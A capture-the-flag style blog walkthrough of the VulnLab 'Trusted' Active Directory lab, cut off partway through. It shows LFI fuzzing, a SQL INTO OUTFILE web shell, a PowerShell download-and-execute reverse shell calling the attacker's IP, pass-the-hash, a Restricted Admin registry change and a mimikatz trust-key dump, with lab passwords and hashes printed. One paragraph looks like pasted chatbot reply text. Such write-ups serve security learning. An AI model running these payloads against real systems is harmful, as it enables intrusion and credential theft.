---
title: "VulnLab Trusted | Maverick Got Your Trusted Baby😉"
description: "First, it’s Maverick did you miss me?!😎 Here we go again, another black-hat-style adventure with an awesome machine from VulnLab! Buckle up, because this one’s got everything web hacking, RDP bypasses"
pubDate: 2025-02-17
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 24
coverImage: "https://cdn-images-1.medium.com/max/800/1*WUOFd45aDewD46j2LVR8ug.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*WUOFd45aDewD46j2LVR8ug.png)

### VulnLab Trusted | Maverick Got Your Trusted Baby😉

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*iPgz3dNl-L351m8G.jpeg)

*Free Palestine with every single drop of my blood*

---

### 📌Overview:

**First, it’s Maverick did you miss me?!** 😎 Here we go again, another black-hat-style adventure with an awesome machine from VulnLab! Buckle up, because this one’s got everything web hacking, RDP bypasses, and some serious AD trust abuse.

It all starts with a web application, your golden ticket to initial access (because honestly, what’s an AD machine without a vulnerable web app?). From there, things escalate quickly. I managed to **bypass Restricted Mode on RDP** (because restrictions are just suggestions, right?), pop a full session, and unleash chaos on AD trusts.

Expect Kerberos magic, token shenanigans, and a moment where you question if Microsoft secretly enjoys red teamers breaking their security. In the end, domain admin falls like a house of cards, and I walk away like a legend. 🔥

#### The Scope

![](https://cdn-images-1.medium.com/max/800/1*jADR_mjNlhvTg_FocrOlWw.png)

### trusted.vl : 10.10.231.181

```bash
nmap -sCV 10.10.231.181 -oN nmap_181  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 20:26 EET  
Nmap scan report for 10.10.231.181  
Host is up (0.61s latency).  
Not shown: 990 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-15 18:34:06Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-02-15T18:34:49+00:00; +7m03s from scanner time.  
| ssl-cert: Subject: commonName=trusteddc.trusted.vl  
| Not valid before: 2025-02-14T18:32:04  
|_Not valid after: 2025-08-16T18:32:04  
| rdp-ntlm-info:  
| Target_Name: TRUSTED  
| NetBIOS_Domain_Name: TRUSTED  
| NetBIOS_Computer_Name: TRUSTEDDC  
| DNS_Domain_Name: trusted.vl  
| DNS_Computer_Name: trusteddc.trusted.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-15T18:34:40+00:00  
Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-02-15T18:34:40  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: mean: 7m03s, deviation: 0s, median: 7m03s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 106.21 seconds
```

### lab.trusted.vl : 10.10.231.182

```bash
nmap -sCV 10.10.231.182 -oN nmap_182  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 20:27 EET  
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 99.99% done; ETC: 20:27 (0:00:00 remaining)  
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 6.67% done; ETC: 20:29 (0:00:14 remaining)  
Nmap scan report for 10.10.231.182  
Host is up (0.56s latency).  
Not shown: 985 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)  
| http-title: Welcome to XAMPP  
|_Requested resource was http://10.10.231.182/dashboard/  
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-15 18:36:27Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)  
443/tcp open ssl/http Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)  
| tls-alpn:  
|_ http/1.1  
| http-title: Welcome to XAMPP  
|_Requested resource was https://10.10.231.182/dashboard/  
|_ssl-date: TLS randomness does not represent time  
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6  
| ssl-cert: Subject: commonName=localhost  
| Not valid before: 2009-11-10T23:48:47  
|_Not valid after: 2019-11-08T23:48:47  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
3306/tcp open mysql MySQL 5.5.5-10.4.24-MariaDB  
| mysql-info:  
| Protocol: 10  
| Version: 5.5.5-10.4.24-MariaDB  
| Thread ID: 9  
| Capabilities flags: 63486  
| Some Capabilities: Support41Auth, LongColumnFlag, InteractiveClient, IgnoreSigpipes, SupportsTransactions, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins  
| Status: Autocommit  
| Salt: A$/^m)#r6W1/8j.FV\KC  
|_ Auth Plugin Name: mysql_native_password  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-02-15T18:37:20+00:00; +7m03s from scanner time.  
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl  
| Not valid before: 2025-02-14T18:32:04  
|_Not valid after: 2025-08-16T18:32:04  
| rdp-ntlm-info:  
| Target_Name: LAB  
| NetBIOS_Domain_Name: LAB  
| NetBIOS_Computer_Name: LABDC  
| DNS_Domain_Name: lab.trusted.vl  
| DNS_Computer_Name: labdc.lab.trusted.vl  
| DNS_Tree_Name: trusted.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-15T18:37:03+00:00  
Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 7m02s, deviation: 0s, median: 7m02s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2025-02-15T18:37:05  
|_ start_date: N/A  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 209.81 seconds
```

There are many ways to get initial access — one from the web and another using MySQL credentials. But to be honest, I don’t want to dig too deep at this stage because the machine is called “Trusted”, so we need to focus on the Trust Attack rather than exploring multiple initial access paths.

### 🎯Step Back: Mapping the Attack Surface

But let’s take a step back. We have two IPs in scope: **trusted.vl** and **lab.trusted.vl**. We need to enumerate every single service from scanning, like SMB, LDAP, and Kerberos, just as I mentioned in my latest blog posts. You have to be organized when solving any AD machine to get good results.

But we also have a web app, and it seems to contain some good stuff. However, let’s imagine we don’t have a web app in this scenario. In that case, we should start by testing for valid Kerberos users, then move on to Kerberoasting and AS-REP Roasting. And of course, when testing SMB, always check for anonymous login — because if you’re lucky, you might just find some user accounts from it or even from LDAP.

#### Port 80

![](https://cdn-images-1.medium.com/max/1200/1*hhsvM2mbwrZXs7fKSGEc3Q.png)

As you can see, it’s a web server. So when I see that, I immediately start fuzzing for directories because I might find some juicy ones through fuzzing. So, let’s fuzz!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# gobuster dir -u http://10.10.231.182/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt      
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.10.231.182/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.htaccess            (Status: 403) [Size: 302]  
/.hta                 (Status: 403) [Size: 302]  
/.htpasswd            (Status: 403) [Size: 302]  
/aux                  (Status: 403) [Size: 302]  
/cgi-bin/             (Status: 403) [Size: 302]  
/com4                 (Status: 403) [Size: 302]  
/com3                 (Status: 403) [Size: 302]  
/com2                 (Status: 403) [Size: 302]  
/com1                 (Status: 403) [Size: 302]  
/con                  (Status: 403) [Size: 302]  
/dashboard            (Status: 301) [Size: 342] [--> http://10.10.231.182/dashboard/]  
/dev                  (Status: 301) [Size: 336] [--> http://10.10.231.182/dev/]  
/examples             (Status: 503) [Size: 402]  
/favicon.ico          (Status: 200) [Size: 30894]  
/img                  (Status: 301) [Size: 336] [--> http://10.10.231.182/img/]  
/index.php            (Status: 302) [Size: 0] [--> http://10.10.231.182/dashboard/]  
/licenses             (Status: 403) [Size: 421]  
/lpt1                 (Status: 403) [Size: 302]  
/lpt2                 (Status: 403) [Size: 302]  
/nul                  (Status: 403) [Size: 302]  
/phpmyadmin           (Status: 403) [Size: 302]  
/prn                  (Status: 403) [Size: 302]  
/server-info          (Status: 403) [Size: 421]  
/server-status        (Status: 403) [Size: 421]  
/webalizer            (Status: 403) [Size: 302]  
Progress: 4734 / 4735 (99.98%)  
===============================================================  
Finished  
===============================================================
```

Hmm, **/dev** looks interesting 👀. After opening it, I had a feeling — this might be vulnerable to LFI 🤔. So, I started fuzzing again!

![](https://cdn-images-1.medium.com/max/800/0*aLOVDhTFsk8YTOQH.gif)

```bash
└─# ffuf -u "http://10.10.231.182/dev/index.html?view=index.html?file=FUZZ" -w /usr(6 results) 20:51:19 [341/370]  
ing/LFI/LFI-gracefulsecurity-windows.txt  
  
/'___\ /'___\ /'___\  
/\ \__/ /\ \__/ __ __ /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\ \ \_\ \ \____/ \ \_\  
\/_/ \/_/ \/___/ \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method : GET  
:: URL : http://10.10.231.182/dev/index.html?view=index.html?file=FUZZ  
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt  
:: Follow redirects : false  
:: Calibration : false  
:: Timeout : 10  
:: Threads : 40  
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________  
C:/apache/php/php.ini [Status: 200, Size: 1131, Words: 58, Lines: 35, Duration: 561ms] C:/apache/logs/access.log [Status: 200, Size: 1139, Words: 58, Lines: 35, Duration: 566ms]  
C:/Users/Administrator/NTUser.dat [Status: 200, Size: 1155, Words: 58, Lines: 35, Duration: 578ms] C:/MySQL/data/mysql.err [Status: 200, Size: 1135, Words: 58, Lines: 35, Duration: 589ms]  
C:/php5/php.ini [Status: 200, Size: 1119, Words: 58, Lines: 35, Duration: 577ms] C:/MySQL/data/hostname.err [Status: 200, Size: 1141, Words: 58, Lines: 35, Duration: 604ms]  
C:/apache/logs/error.log [Status: 200, Size: 1137, Words: 58, Lines: 35, Duration: 614ms]  
C:/inetpub/wwwroot/global.asa [Status: 200, Size: 1147, Words: 58, Lines: 35, Duration: 614ms]  
C:/MySQL/my.cnf [Status: 200, Size: 1119, Words: 58, Lines: 35, Duration: 628ms]  
C:/boot.ini [Status: 200, Size: 1111, Words: 58, Lines: 35, Duration: 641ms]  
C:/MySQL/data/mysql.log [Status: 200, Size: 1135, Words: 58, Lines: 35, Duration: 639ms]  
C:/WINDOWS/Repair/SAM [Status: 200, Size: 1131, Words: 58, Lines: 35, Duration: 676ms]  
C:/MySQL/my.ini [Status: 200, Size: 1119, Words: 58, Lines: 35, Duration: 716ms]  
C:/php4/php.ini [Status: 200, Size: 1119, Words: 58, Lines: 35, Duration: 719ms]  
C:/WINDOWS/php.ini [Status: 200, Size: 1125, Words: 58, Lines: 35, Duration: 729ms]  
C:/php/php.ini [Status: 200, Size: 1117, Words: 58, Lines: 35, Duration: 736ms]  
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1163, Words: 58, Lines: 35, Duration: 593ms]  
C:/Windows/repair/security [Status: 200, Size: 1141, Words: 58, Lines: 35, Duration: 605ms]  
C:/WINNT/win.ini [Status: 200, Size: 1121, Words: 58, Lines: 35, Duration: 595ms]  
C:/xampp/apache/bin/php.ini [Status: 200, Size: 1143, Words: 58, Lines: 35, Duration: 590ms]  
C:/Windows/Panther/Unattend/Unattended.xml [Status: 200, Size: 1173, Words: 58, Lines: 35, Duration: 578ms]  
C:/Windows/Panther/Unattended.xml [Status: 200, Size: 1155, Words: 58, Lines: 35, Duration: 570ms]  
C:/Windows/debug/NetSetup.log [Status: 200, Size: 1147, Words: 58, Lines: 35, Duration: 610ms] C:/Windows/system32/config/AppEvent.Evt [Status: 200, Size: 1167, Words: 58, Lines: 35, Duration: 622ms]  
C:/Windows/system32/config/SecEvent.Evt [Status: 200, Size: 1167, Words: 58, Lines: 35, Duration: 608ms]  
C:/Windows/system32/config/default.sav [Status: 200, Size: 1165, Words: 58, Lines: 35, Duration: 617ms]  
C:/Windows/system32/config/security.sav [Status: 200, Size: 1167, Words: 58, Lines: 35, Duration: 618ms]  
C:/Windows/system32/config/software.sav [Status: 200, Size: 1167, Words: 58, Lines: 35, Duration: 569ms]  
C:/Windows/system32/config/system.sav [Status: 200, Size: 1163, Words: 58, Lines: 35, Duration: 572ms]
```

![](https://cdn-images-1.medium.com/max/1200/1*WlsaIvJqw78gayCOeGVeyA.png)

![](https://cdn-images-1.medium.com/max/1200/1*z2tBt18tVcX5IDXZqMUpXg.png)

The source of the **index.html** file can be checked using `php://filter` to encode its contents in **base64**. This helps reveal any PHP code that might be executed if it's in plain text.

After viewing the source page, it becomes clear why local file inclusion was possible — it’s using `include` on a **GET** parameter and accepting files. Additionally, there’s a comment from **Eric** mentioning database connection setup. After fuzzing for PHP files, **db.php** is discovered.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# ffuf -u "http://10.10.231.182/dev/index.html?view=FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fw 58  
  
  
/'___\ /'___\ /'___\  
/\ \__/ /\ \__/ __ __ /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\ \ \_\ \ \____/ \ \_\  
\/_/ \/_/ \/___/ \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method : GET  
:: URL : http://10.10.231.182/dev/index.html?view=FUZZ.php  
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt  
:: Follow redirects : false  
:: Calibration : false  
:: Timeout : 10  
:: Threads : 40  
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter : Response words: 58  
________________________________________________  
  
db [Status: 200, Size: 763, Words: 26, Lines: 31, Duration: 556ms]  
system [Status: 200, Size: 892, Words: 47, Lines: 32, Duration: 683ms]  
pear [Status: 200, Size: 741, Words: 25, Lines: 31, Duration: 702ms]  
table [Status: 200, Size: 1185, Words: 67, Lines: 38, Duration: 562ms]  
con [Status: 200, Size: 1079, Words: 56, Lines: 35, Duration: 553ms]  
aux [Status: 200, Size: 1077, Words: 55, Lines: 35, Duration: 4709ms]                                                                                                             
```

```bash
http://10.10.231.182/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\db.php
```

```bash
PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# echo "PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=" | base64 -d  
<?php  
$servername = "localhost";  
$username = "root";  
$password = "SuperSecureMySQLPassw0rd1337.";  
  
$conn = mysqli_connect($servername, $username, $password);  
  
if (!$conn) {  
die("Connection failed: " . mysqli_connect_error());  
}  
echo "Connected successfully";  
?>
```
So, as you can see, we got the MySQL credentials. After that, we log in to MySQL and enumerate the database, where we find hashes. Cracking them gives us the credentials for **rsmith**. Finally, we validate them using **nexec**.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# nxc smb 10.10.231.182 -u 'rsmith' -p 'IHateEric2' --shares  
SMB 10.10.231.182 445 LABDC [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)  
SMB 10.10.231.182 445 LABDC [+] lab.trusted.vl\rsmith:IHateEric2  
SMB 10.10.231.182 445 LABDC [*] Enumerated shares  
SMB 10.10.231.182 445 LABDC Share Permissions Remark  
SMB 10.10.231.182 445 LABDC ----- ----------- ------  
SMB 10.10.231.182 445 LABDC ADMIN$ Remote Admin  
SMB 10.10.231.182 445 LABDC C$ Default share  
SMB 10.10.231.182 445 LABDC IPC$ READ Remote IPC  
SMB 10.10.231.182 445 LABDC NETLOGON READ Logon server share  
SMB 10.10.231.182 445 LABDC SYSVOL READ
```

This is one way to get initial access, but I didn’t use this method. Instead, I got **RCE** through **LFI**, performed **DCSync**, grabbed the administrator’s hashes, and started the machine from there.

**Method 2: MySQL to RCE — Dropping a Web Shell**

Since the MySQL port is open and the database is running as root, we can use the **phpinfo** file to drop a web shell in the **/dev** directory and get **RCE**.

```powershell
select '<?php echo "command: " . system($_REQUEST["cmd"]); ?>' into outfile "C:\\xampp\\htdocs\\dev\\shell.php";
```

```powershell
cmd=powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.8.5.124/shell.php');
```

By creating a **reverse shell**, then starting a **Python server** and setting up a **listener**, we successfully get our shell. Now, it’s time to hunt for passwords as part of **Windows privilege escalation**. The best script for this is [**LaZagne**](https://github.com/AlessandroZ/LaZagne), which helps retrieve passwords and hashes. 🔥

You’ll get the **administrator’s hash** using **LaZagne**, and if you want more, you can retrieve additional hashes with **impacket-secretdump**. After validating the hash, it works! Now, I’ll use **PS Remote**, but as I mentioned before, always validate the hash against multiple services like **MSSQL, SMB, WinRM, RDP**, and so on.

WinRM works fine, but **RDP doesn’t** — so I bypassed **Restricted Mode on RDP** and logged in successfully! 🔥😈

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# evil-winrm -i 10.10.231.182 -u Administrator -H '75878369ad33f35b7070ca854100bc07'  
  
Evil-WinRM shell v3.5  
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
^[[A^[[A^[[A^[[A^[[A^[[A*Evil-WinRM* PS C:\Users\Administrator\Documents>  
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls  
  
  
Directory: C:\Users\Administrator\Desktop  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-a---- 9/14/2022 3:33 PM 36 User.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat user.txt  
VL{349efd4b1ccbeb4d3ca0108fa5cc5802}  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f  
The operation completed successfully.
```

![](https://cdn-images-1.medium.com/max/800/0*o6Y_n1nLR68Mw0GR.png)

*Restricted Admin Mode on RDP*

![](https://cdn-images-1.medium.com/max/800/0*caJUdRp3HM-4iOdz.gif)

So, I bypassed that, as you can see in the **Evil-WinRM** session’s last command… and here we go!

![](https://cdn-images-1.medium.com/max/800/0*_9PsWQkvdMpL4jQH.gif)

![](https://cdn-images-1.medium.com/max/800/1*nCf6dLqMyCP6cK5SAAgxVw.png)

*I like that*

Got it, brother! This is the real deal now — the most important stage of the machine. Forget the initial access, that was just a warm-up. **Now, this is where the magic happens!** 🔥

But first, you want me to check out Will Schroeder**’s talk** — which one are you referring to? His stuff on **Active Directory, trust abuse, or Kerberos attacks?** Let me know, and I’ll sync up with what you’re thinking!

<div class="video-embed"><iframe src="https://www.youtube.com/embed/YmzfWHiXNZ8" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

<div class="video-embed"><iframe src="https://player.vimeo.com/video/787332389?app_id=122963" loading="lazy" allowfullscreen></iframe></div>

### 📌Let the war begin with the Trust Attack!

### Enumeration Phase: Mapping the Battlefield 🔍🔥

After opening the **RDP session**, I launched **Administrator PowerShell**, imported the **Active Directory module**, and started enumerating **users, trusts, forests**, and more. This stage usually takes some time, so I’ll be making a **separate blog post** focused on **post-initial access enumeration in Active Directory**.

#### Trust Enumeration: Unraveling the AD Relationships

```powershell
PS C:\Users\Administrator> Get-ADTrust -Filter *  
  
  
Direction : BiDirectional  
DisallowTransivity : False  
DistinguishedName : CN=trusted.vl,CN=System,DC=lab,DC=trusted,DC=vl  
ForestTransitive : False  
IntraForest : True  
IsTreeParent : False  
IsTreeRoot : False  
Name : trusted.vl  
ObjectClass : trustedDomain  
ObjectGUID : c8005918-3c50-4c33-bcaa-90c76f46561c  
SelectiveAuthentication : False  
SIDFilteringForestAware : False  
SIDFilteringQuarantined : False  
Source : DC=lab,DC=trusted,DC=vl  
Target : trusted.vl  
TGTDelegation : False  
TrustAttributes : 32  
TrustedPolicy :  
TrustingPolicy :  
TrustType : Uplevel  
UplevelOnly : False  
UsesAESKeys : False  
UsesRC4Encryption : False  
  
  
  
PS C:\Users\Administrator>
```

![](https://cdn-images-1.medium.com/max/800/1*nCf6dLqMyCP6cK5SAAgxVw.png)

With that command, we now know that **lab.trusted.vl** has a **Bi-Directional Trust** with **trusted.vl**. But honestly, I already knew that before enumerating in RDP — because I uploaded **SharpHound**, ran it, and got the results right away!

![](https://cdn-images-1.medium.com/max/800/1*TqU1TqICZQSMp9Ni1S9w2A.png)

Now I will perform the SID History Attack, as mentioned in the talk I referenced earlier.

I uploaded Mimikatz by running a Python server and then transferred it from my attacker machine to the RDP session using this command:

```powershell
Invoke-WebRequest -Uri "http://10.8.5.124/mimi.exe" -OutFile "C:\Users\Administrator\Documents\mimi.exe"
```

1. First step: Dumping trust secrets using **this Mimikatz module**:

```powershell
PS C:\Users\Administrator\Documents> ./mimi.exe "lsadump::trust /patch" "exit"  
  
.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08  
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)  
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
## \ / ## > https://blog.gentilkiwi.com/mimikatz  
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )  
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/  
  
mimikatz(commandline) # lsadump::trust /patch  
  
Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)  
  
Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591)  
[ In ] LAB.TRUSTED.VL -> TRUSTED.VL  
* 2/15/2025 6:47:42 PM - CLEAR - ad 4a 9a 08 93 2b 62 f1 5a d7 df 25 a6 3c da 9c b1 a7 8a 2f 7f e4 04 fe 21 0a a0 5a 36 af 51 4e 56 4e 2b c6 be 17 b3 68 de 96 04 62 b0 c5 e0 a0 e8 90 22 65 f4 12 86 3f da 2b cb d7 34 f9 9e ad 53 d5 bb 81 96 07 8e 1b 94 3a c4 9c 8a 62 58 dc 55 76 36 b7 77 a4 a8 33 58 50 e4 b9 58 ed 63 21 60 b3 d5 48 c9 16 5d 96 88 52 04 e2 63 18 54 86 3a 14 7d 92 5c 62 99 bf e9 27 bc 93 37 e6 da 6c 1e b0 f3 e6 79 43 85 b3 af 90 6a 38 ec ef 6c a5 0d e2 f5 28 68 5a 0d e2 bd 84 3e d7 21 a3 b6 8b ff 57 d4 b4 6b a7 70 4a a2 e3 f1 25 d7 83 69 20 9a 77 a2 71 3d 1a f8 c6 f0 fb 3f ed 0c 63 5f 37 3a 47 5f 9e 60 0d 87 f7 52 5c 20 e3 a6 a0 60 37 6f 7b 3d 24 c1 01 1f e9 32 15 39 f8 9c 99 22 60 0e 9a 79 c8 c8 38 cd dc ec 5b f4 91 bc 62 64 8b  
* aes256_hmac 7d52770f3e1d54f3e5283b275eca8ccd90d53244175dcf751ebd2f465af038c8  
* aes128_hmac 4882ff6bf62aefaa071edeb824ee0612  
* rc4_hmac_nt 29dcfffd25cf0e36b487a9c4bd465319  
  
[ Out ] TRUSTED.VL -> LAB.TRUSTED.VL  
* 2/15/2025 7:02:42 PM - CLEAR - 9b ca d0 cd 75 16 60 8e 18 49 33 bf d9 17 e0 23 97 f5 b8 39 b6 24 e8 84 23 30 04 d3 57 4d 36 40 23 44 30 13 8e 5b eb 7c a6 5c 01 b6 49 85 4c 73 86 13 6b 8a d3 df 19 03 c5 5b b2 a6 bc 6c e5 cf ae 97 d8 87 bc 54 35 d4 f5 71 b6 28 5b ff 55 16 32 63 21 78 35 fb c7 b5 85 61 f7 df df 32 a8 6c 75 a9 dd 30 33 90 f2 81 b5 4f 75 61 e8 4c 76 d1 90 48 b2 45 dd 11 dc d0 3c 5e 17 a7 35 4f 8e db df 83 3c 5f 6e dd e9 e1 ac 17 90 53 58 ab cb 48 ac e1 cf 71 5d e7 12 c0 b8 3d c6 3f 25 56 10 e5 49 4b b0 d1 1b ff 72 3f 78 a8 f0 67 97 e1 fa 98 e7 91 7a fa 1e 49 9e 52 53 af a7 4e 0c 94 e4 6b 0f db c7 01 5f 07 73 f2 63 cf 74 fc 32 a7 02 f8 9c 8f d6 85 16 09 f5 27 7a a0 64 aa 64 9b f3 e8 e4 fd 28 2f 64 ec f8 85 7b 88 01 7f 3e 33 53 38  
* aes256_hmac 94276ee51327110295ce9d03547c203d08db16b8385fc3391c2b599f44803f8d  
* aes128_hmac bf84dbf7d0b72a5d26156ba6a5c33671  
* rc4_hmac_nt aba63a11ab05b2765b2b81d0910bbc15  
  
[ In-1] LAB.TRUSTED.VL -> TRUSTED.VL  
* 5/27/2023 4:19:25 PM - CLEAR - ea 31 66 22 35 93 0e ef 05 dd e5 94 f0 70 b5 dd 2c de b4 ec 7a 47 73 ae 20 45 15 00 9c 0c 1a 7e 9a f4 68 c7 22 c9 d2 35 cb 67 bb 8d 56 7e 5b 9f 4e 9c b4 4c 77 a6 b7 41 2e d9 3d e4 87 73 5b ee 44 8b 4f 3f f3 e8 ac 32 21 08 db 79 9a 55 2b a0 6f c2 dd 69 c6 9a b7 4d e1 8a 4c f6 e8 0b 47 a9 cb cf 4d 6f 14 8c 28 44 66 63 85 20 13 3b c8 93 bd 20 38 ff 6c 73 d3 2a 61 a3 10 fc 2f d5 af 29 a8 5b 28 09 0d 1f 17 46 8d 7d 09 fa e8 55 61 2e d7 6b 3a 70 38 11 e0 42 08 4b 5b 2b be 53 2c 62 97 64 42 4e 11 fb 50 ed 2f ef 58 38 be 20 a4 4b f6 cf a7 45 18 73 56 be cd 6c 0a 78 16 f7 51 ae 82 59 95 7a 33 f0 27 a6 6d 08 62 ca 74 5f 82 13 c2 d2 aa 7b 12 96 b8 16 27 2e ee 48 bd e4 21 41 db a2 e2 92 ca f3 5d d6 76 cc b5 66 28 2a 87 92  
* aes256_hmac a7880265164670ddfc041c250bdf7d8166bf8ca0c06d86c3ddec12620fdfb800  
